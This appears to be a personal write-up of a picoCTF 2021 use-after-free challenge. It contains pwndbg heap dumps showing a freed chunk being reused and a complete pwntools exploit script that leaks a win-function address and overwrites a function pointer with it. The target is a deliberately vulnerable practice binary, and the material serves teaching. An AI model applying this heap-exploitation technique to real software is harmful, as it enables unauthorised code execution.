
[[use-after-free]]

32 bit Use after free exploit from PicoCTF 21. I followed the video from [CryptoCat](https://www.youtube.com/watch?v=YGQAvJ__12k&ab_channel=CryptoCat) for this exploit.
I followed along with the video to try and get a better understanding of how these exploits work though I put the script together on my own. I noticed a fancy way of getting the leaked address from the output which has been incorporated into my script.



after first malloc - this is what is set to rax - 4 
```
pwndbg> x/8wx 0x804c1a0 -4
0x804c19c:      0x00000011      0x00000000      0x00000000      0x00000000
0x804c1ac:      0x00021e59      0x00000000      0x00000000      0x00000000
```

we can see 0x0000011 bytes (it's allocated 16 bytes and the extra byte indicates that the chunk before is in use)

There is currently no data in the chunk

Create an account using the M function and call the username beast:
```
pwndbg> x/8wx 0x804c1a0 -4
0x804c19c:      0x00000011      0x080489f6      0x0804c630      0x00000000
0x804c1ac:      0x00000411      0x73616562      0x00000a74      0x00000000
```

The first line is the function pointer `0x080489f6` and username pointer `0x0804c630` -> 

```
pwndbg> x/gwx 0x0804c630
0x804c630:      0x 73 61 65 62 -> 'beast'
```

This one is pointing to the function 'M' but we want it to point to the win function:

```
pwndbg> x/gx 0x080489f6
0x80489f6 <m>:  0xe804ec8353e58955
```


After freeing using the I function:

```
pwndbg> x/8wx 0x804c1a0 - 4
0x804c19c:      0x00000011      0x0000804c      0xafaa7c01      0x00000000
0x804c1ac:      0x00000411      0x73610a59      0x00000a74      0x00000000
```


So we can see now using `heap`

```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x804c008
Size: 0x190 (with flag bits: 0x191)

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x804c198
Size: 0x10 (with flag bits: 0x11)
fd: 0x804c

Allocated chunk | PREV_INUSE
Addr: 0x804c1a8
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x804c5b8
Size: 0x70 (with flag bits: 0x71)

Allocated chunk | PREV_INUSE
Addr: 0x804c628
Size: 0x70 (with flag bits: 0x71)

Top chunk | PREV_INUSE
Addr: 0x804c698
Size: 0x21968 (with flag bits: 0x21969)
```

There is one free chunk available (which we've just freed) `Addr: 0x804c198`

Now what if we leave a message with the address of the win function, will it be allocated to that free chunk?

Yes!

```
pwndbg> c
Continuing.
0x80487d6

Program received signal SIGSEGV, Segmentation fault.
0x30387830 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────────────────
*EAX  0x30387830 ('0x80')
 EBX  0x804b000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804af0c (_DYNAMIC) ◂— 1
*ECX  0x804c1a0 ◂— '0x80487d'
*EDX  8
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
 ESI  0xffffd1f4 —▸ 0xffffd34b ◂— '/home/beast/pico 21/vuln'
 EBP  0xffffd108 —▸ 0xffffd128 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0
*ESP  0xffffd0fc —▸ 0x8048985 (doProcess+23) ◂— nop
*EIP  0x30387830 ('0x80')
─────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0x30387830
```

we get a seg fault when entering data into the message. Obviously above i was entering the address as an ascii string which would not work but if we plug this into a pwntools script we should be able to redirect the program to the win function.


```
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break *0x8048d6f
break *0x8048aff
break *0x8048a61
continue
'''.format(**locals())

# Binary filename
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

io.sendlineafter(b'(e)xit', b'M')
io.sendlineafter(b'username', b'beast')

io.sendlineafter(b'(e)xit', b'I')
io.sendlineafter(b'?', b'Y')

io.sendlineafter(b'(e)xit', b'S')

print(io.recvline())


##### MY INITIAL CODE #####
# result = io.recvline()
# result = result.split(b'...')
# leaked_address = result[1]
# print(leaked_address)

##### CryptoCat Solution (more elegant) ##### (I need to remember this for next time!)
#Recieve until the below delimiter and when recieved, drop it.
io.recvuntil(b'OOP! Memory leak...', drop=True)
# once the above delimiter has been dropped, recieve the rest of the line as a string. Then, interpret it as an integer from hex (16)
leak = int(io.recvlineS(), 16)
info("leaked hahaexploitgobrrr() address: %#x", leak)

io.sendlineafter(b'(e)xit', b'l')
io.sendlineafter(b'ways:', p32(leak))


# Got Flag?
warn(io.recvlines(2)[1].decode())

```